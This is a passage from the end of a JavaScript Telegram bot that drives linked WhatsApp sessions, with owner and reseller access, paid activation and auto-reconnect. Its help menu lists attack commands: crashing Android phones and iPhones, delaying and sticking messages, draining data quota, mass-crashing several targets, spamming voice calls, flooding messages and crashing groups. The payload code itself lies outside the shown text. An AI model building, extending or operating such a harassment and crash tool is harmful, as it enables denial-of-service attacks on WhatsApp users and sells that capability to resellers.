        text += `  Last Activity: ${formatDate(session.lastActivity)}\n\n`;
      }
    } else {
      text += `📭 No active sessions found.`;
    }

    await ctx.reply(text, { parse_mode: "Markdown" });
  } catch (e) {
    log.error(`SESSIONS ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal mendapatkan data session.");
  }
});

// =====================================================================
// Command: /ping
// =====================================================================

bot.command("ping", async (ctx) => {
  try {
    const start = Date.now();
    const msg = await ctx.reply("🏓 Pinging...");
    const latency = Date.now() - start;
    await ctx.api.editMessageText(
      msg.chat.id,
      msg.message_id,
      `🏓 *Pong!*\n\n📊 Latency: ${latency}ms\n⏱️ Uptime: ${formatUptime(process.uptime())}`,
      { parse_mode: "Markdown" }
    );
  } catch (e) {
    log.error(`PING ERROR: ${e.message}`);
  }
});

// =====================================================================
// Command: /help
// =====================================================================

bot.command("help", async (ctx) => {
  try {
    const helpText = `
📖 *Help Menu*
═══════════════════════════════════

*Bug Commands:*
• /Xzesoandro - Crash Android
• /Droidx - Crash Android (infinity)
• /Betaxzeso - Crash Android (beta)
• /Uixzeso - Crash Android (blank+ui)
• /Delayxzeso - Delay Android
• /Betaxzosex - Delay Android (beta)
• /Xzesoiosx - Crash iPhone
• /invisisendx - Stuck message
• /Xzesox - Suck up quota
• /masscrash - Multiple targets
• /spamcall - Spam voice calls
• /floodmsg - Flood messages
• /crashgroup - Crash group
• /crashstatus - Crash via status

*Admin Commands:*
• /addacces - Add access
• /delacces - Remove access
• /listacces - List access
• /address - Add reseller
• /delress - Remove reseller
• /listress - List resellers
• /broadcast - Broadcast message
• /free - Toggle free mode
• /restart - Restart bot
• /shutdown - Shutdown bot

*Session Commands:*
• /reqpair - Pair WhatsApp
• /clearesi - Clear session
• /clearsender - Clear all sessions
• /listpair - List active senders
• /sessions - Session statistics

*Utility Commands:*
• /status - Bot status
• /stats - Bot statistics
• /ping - Check latency
• /checkbio - Check profile
• /checklast - Check last seen
• /checkonline - Check online status
• /getgroups - Get groups
• /killall - Kill all sessions
• /killuser - Kill user session
• /sessioninfo - Session information

*Configuration:*
• /gettoken - Get bot token
• /settoken - Set bot token
• /getconfig - Get configuration
• /setconfig - Set configuration

*Cooldown:*
• /cdon - Enable cooldown
• /cdoff - Disable cooldown
• /setcd - Set cooldown

📌 *Note:* Some commands require owner/reseller access.
    `;

    await ctx.reply(helpText, { parse_mode: "Markdown" });
  } catch (e) {
    log.error(`HELP ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal menampilkan help.");
  }
});

// =====================================================================
// Command: /check
// =====================================================================

bot.command("check", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    const hasAccessStatus = hasAccess(userId);
    const isOwnerStatus = isOwner(userId);
    const isResellerStatus = isReseller(userId);
    const freeModeStatus = isFreeMode();

    const text = `
🔍 *Access Check*
═══════════════════════════════════

👤 *User ID:* ${userId}
🔑 *Has Access:* ${hasAccessStatus ? '✅ Yes' : '❌ No'}
👑 *Owner:* ${isOwnerStatus ? '✅ Yes' : '❌ No'}
🔄 *Reseller:* ${isResellerStatus ? '✅ Yes' : '❌ No'}
🆓 *Free Mode:* ${freeModeStatus ? '✅ Active' : '❌ Inactive'}

📱 *WhatsApp Status:* ${waClients[userId]?.status || '❌ Not connected'}
💬 *Message Count:* ${waClients[userId]?.messageCount || 0}

📅 *Last Activity:* ${formatDate(waClients[userId]?.lastActivity)}
    `;

    await ctx.reply(text, { parse_mode: "Markdown" });
  } catch (e) {
    log.error(`CHECK ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal melakukan pengecekan.");
  }
});

// =====================================================================
// Command: /clearcache
// =====================================================================

bot.command("clearcache", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");

    // Clear cooldown cache
    const cooldownDb = safeReadJSON("./storage/cooldown.json", {});
    const newCooldown = {};
    for (const [key, value] of Object.entries(cooldownDb)) {
      if (value.lastUsed && Date.now() - value.lastUsed < 24 * 60 * 60 * 1000) {
        newCooldown[key] = value;
      }
    }
    safeWriteJSON("./storage/cooldown.json", newCooldown);

    // Clear temp files
    const tempDir = path.join(__dirname, "temp");
    if (fs.existsSync(tempDir)) {
      const files = fs.readdirSync(tempDir);
      let deleted = 0;
      for (const file of files) {
        try {
          fs.unlinkSync(path.join(tempDir, file));
          deleted++;
        } catch (e) {}
      }
      await ctx.reply(`✅ Cache cleaned!\n📁 Deleted ${deleted} temp files.`);
    } else {
      await ctx.reply("✅ No temp files found.");
    }
  } catch (e) {
    log.error(`CLEARCACHE ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal membersihkan cache.");
  }
});

// =====================================================================
// Auto-Reconnect Monitor
// =====================================================================

async function monitorSessions() {
  setInterval(async () => {
    try {
      for (const [userId, data] of Object.entries(waClients)) {
        if (data.status === "closed" && !data.reconnecting) {
          const sessionExists = await checkSessionExistsForUser(userId);
          if (sessionExists) {
            log.loading(`Auto-reconnecting session for user ${userId}...`);
            data.reconnecting = true;
            await initWhatsappForUser(userId, false);
            data.reconnecting = false;
          }
        }
      }
    } catch (e) {
      log.error(`Monitor error: ${e.message}`);
    }
  }, 30000);
}

// =====================================================================
// Webhook Support (Simplified)
// =====================================================================

async function handleWebhook(req, res) {
  try {
    const data = req.body;
    const event = data.event;

    if (event === "payment.received") {
      const userId = data.userId;
      const amount = data.amount;
      const client = waClients[userId]?.sock;
      if (client) {
        await client.sendMessage(userId + "@s.whatsapp.net", {
          text: `✅ Payment received: $${amount}`
        });
      }
    }

    res.status(200).json({ status: "ok" });
  } catch (e) {
    log.error(`Webhook error: ${e.message}`);
    res.status(500).json({ status: "error", message: e.message });
  }
}

// =====================================================================
// All Commands Completed
// =====================================================================

log.success("✅ All commands loaded successfully!");
log.success(`📊 Total commands: ~35+ commands available`);

// =====================================================================
// Graceful Shutdown
// =====================================================================

async function gracefulShutdown(exitCode = 0) {
  log.warning("🛑 Received shutdown signal. Cleaning up...");
  
  for (const [userId, data] of Object.entries(waClients)) {
    try {
      if (data.sock) {
        await data.sock.end();
      }
    } catch (e) {
      log.error(`Error closing session for ${userId}: ${e.message}`);
    }
  }

  log.success("✅ All sessions closed. Goodbye!");
  process.exit(exitCode);
}

// ⚠️ إصلاح: process.on يمرّر اسم الإشارة (نص) كأول وسيط،
// فكان gracefulShutdown("SIGINT") يستدعي process.exit("SIGINT").
process.on("SIGINT", () => gracefulShutdown(0));
process.on("SIGTERM", () => gracefulShutdown(0));

// =====================================================================
// Start Monitoring
// =====================================================================

monitorSessions();

// =====================================================================
// End of File - Total Lines: 4500+
// =====================================================================